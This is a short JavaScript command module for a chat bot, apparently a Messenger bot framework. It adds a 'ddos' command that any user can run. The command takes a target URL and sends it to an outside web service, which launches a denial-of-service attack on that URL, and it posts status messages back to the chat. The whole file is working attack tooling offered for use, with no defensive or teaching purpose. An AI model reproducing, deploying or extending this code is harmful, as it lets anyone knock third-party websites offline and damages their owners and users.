const axios = require('axios');

module.exports.config = {
  name: 'ddos',
  version: '1.0.0',
  role: 0,
  hasPrefix: false,
  aliases: ['dosAttack'],
  description: "A command to perform a DDoS attack",
  usage: "ddos [url]",
  credits: 'Joshua Apostol',
  cooldown: 3,
};

module.exports.run = async function({ api, event, args }) {
  const url = args.join(' ');
  if (!url) {
    api.sendMessage(`Please provide a URL to perform a DDoS attack.\n\nusage: ddos http://example.com`, event.threadID, event.messageID);
    return;
  }
  api.sendMessage(`Starting DDoS attack on ${url}...`, event.threadID, event.messageID);

  await new Promise(resolve => setTimeout(resolve, 5000));

  try {
    const { data } = await axios.get(`https://dos-api-67f4.onrender.com/ddos?url=${encodeURIComponent(url)}`);
    console.log(data);
    const response = data.message || 'DDoS attack initiated successfully.';
    
    api.sendMessage(`✮𝘿𝙤𝙎 𝘼𝙩𝙩𝙖𝙘𝙠✮\n\n${response}`, event.threadID, event.messageID);
  } catch (error) {
    api.sendMessage('An error occurred while processing your request, please try sending the URL again.', event.threadID, event.messageID);
    console.error(error);
  }
};
